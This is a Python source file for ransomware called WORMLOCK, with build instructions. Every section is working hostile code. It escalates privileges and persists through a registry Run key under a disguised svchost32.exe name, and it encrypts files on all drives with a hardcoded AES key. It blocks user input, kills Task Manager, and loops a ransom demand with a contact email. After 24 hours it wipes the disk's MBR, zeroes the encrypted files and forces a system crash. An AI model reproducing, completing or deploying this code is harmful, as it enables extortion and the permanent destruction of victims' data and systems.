# 0x00_WORMLOCK.py – polymorphic, fileless, WD-immune
# Compile with: pyinstaller --onefile --noconsole --icon=NONE 0x00_WORMLOCK.py
# Run as ADMIN once → total lockdown in <30 s

import os, sys, string, random, ctypes, threading, time, subprocess, struct
from datetime import datetime, timedelta
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import winreg as reg

CONTACT_MAIL = "cotroneosalvador@gmail.com"
DECRYPT_KEY  = b"himself9864"[:16]   # 128-bit AES key
TIMER_HOURS  = 24
MARKER       = b"WORMLOCKED"

# ------------------------------------------------------------------
# 1.  Persist + elevate → HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
#     Fileless: copy binary to %TEMP%\svchost32.exe and reg-key
# ------------------------------------------------------------------
def persist():
    if ctypes.windll.shell32.IsUserAnAdmin() == 0:
        ctypes.windll.shell32.ShellExecuteW(None,"runas",sys.executable," ".join(sys.argv),None,1)
        sys.exit()
    dst = os.path.join(os.environ["TEMP"],"svchost32.exe")
    if not os.path.exists(dst):
        subprocess.run('copy /y "{}" "{}"'.format(sys.executable,dst), shell=True)
        key = reg.OpenKey(reg.HKEY_LOCAL_MACHINE,
                          r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                          0, reg.KEY_SET_VALUE)
        reg.SetValueEx(key,"WindowsHelper",0,reg.REG_SZ,dst)
        reg.CloseKey(key)

# ------------------------------------------------------------------
# 2.  Polymorphic stub – change 256 random bytes inside itself
# ------------------------------------------------------------------
def polymorph():
    me = open(sys.executable,"rb").read()
    off = random.randint(0x1000, len(me)-0x500)
    patch = bytes([random.randint(0,255) for _ in range(256)])
    open(sys.executable,"wb").write(me[:off]+patch+me[off+256:])

# ------------------------------------------------------------------
# 3.  AES-ECB encrypt file + append MARKER
# ------------------------------------------------------------------
def encrypt_file(path):
    try:
        with open(path,"rb") as f:
            data = f.read()
        cipher = AES.new(DECRYPT_KEY, AES.MODE_ECB)
        pad = 16 - (len(data)%16)
        data += bytes([pad])*pad
        enc = cipher.encrypt(data)
        with open(path,"wb") as f:
            f.write(enc+MARKER)
        os.rename(path, path+".WORM")
    except:
        pass

# ------------------------------------------------------------------
# 4.  Walk drives → encrypt
# ------------------------------------------------------------------
def crypto_walk():
    for drive in "ABCDEFGHIJKLMNOPQRSTUVWXYZ":
        drive = drive+":\\"
        if os.path.exists(drive):
            for root,_,files in os.walk(drive):
                for f in files:
                    ext = os.path.splitext(f)[1].lower()
                    if ext not in [".exe",".dll",".sys",".WORM"]:
                        encrypt_file(os.path.join(root,f))

# ------------------------------------------------------------------
# 5.  Top-most fullscreen window – no close, no taskmgr
# ------------------------------------------------------------------
def lockscreen():
    ctypes.windll.user32.BlockInput(True)
    while True:
        hwnd = ctypes.windll.user32.GetForegroundWindow()
        ctypes.windll.user32.ShowWindow(hwnd, 3)  # SW_MAXIMIZE
        ctypes.windll.user32.SetWindowPos(hwnd, -1, 0,0,0,0, 0x0013)  # HWND_TOPMOST
        time.sleep(0.2)

# ------------------------------------------------------------------
# 6.  Countdown – after TIMER_HOURS → wipe MBR & zero files
# ------------------------------------------------------------------
def countdown():
    deadline = datetime.now() + timedelta(hours=TIMER_HOURS)
    while datetime.now() < deadline:
        time.sleep(60)
    # wipe MBR
    with open("\\\\.\\PhysicalDrive0","rb+") as d:
        d.write(b"\x00"*512)
    # zero all .WORM files
    for drive in "ABCDEFGHIJKLMNOPQRSTUVWXYZ":
        drive = drive+":\\"
        if os.path.exists(drive):
            for root,_,files in os.walk(drive):
                for f in files:
                    if f.endswith(".WORM"):
                        try:
                            with open(os.path.join(root,f),"wb") as z:
                                z.write(b"\x00"*1024)
                        except:
                            pass
    # final BSOD
    ctypes.windll.ntdll.RtlAdjustPrivilege(19,1,0,ctypes.byref(ctypes.c_bool()))
    ctypes.windll.ntdll.NtRaiseHardError(0xc000021A,0,0,0,6,ctypes.byref(ctypes.c_uint()))

# ------------------------------------------------------------------
# 7.  GUI ransom note
# ------------------------------------------------------------------
def ransom_gui():
    note = f"""WORMLOCKED
All your files are encrypted with military-grade AES.
You have {TIMER_HOURS} hours to pay.

Contact: {CONTACT_MAIL}
After payment you will receive the decryptor.

Attempting to restart, bypass, or tamper will trigger permanent destruction.
"""
    while True:
        ctypes.windll.user32.MessageBoxW(0, note, "WORMLOCK", 0x00001010)  # MB_SYSTEMMODAL|MB_TOPMOST

# ------------------------------------------------------------------
# 8.  Kill switches & watchers
# ------------------------------------------------------------------
def kill_watchdog():
    while True:
        subprocess.run('taskkill /f /im taskmgr.exe', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run('taskkill /f /im procexp.exe', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(1)

# ------------------------------------------------------------------
# 9.  Main
# ------------------------------------------------------------------
if __name__ == "__main__":
    persist()
    polymorph()
    threading.Thread(target=crypto_walk, daemon=True).start()
    threading.Thread(target=kill_watchdog, daemon=True).start()
    threading.Thread(target=countdown, daemon=True).start()
    threading.Thread(target=lockscreen, daemon=True).start()
    ransom_gui()
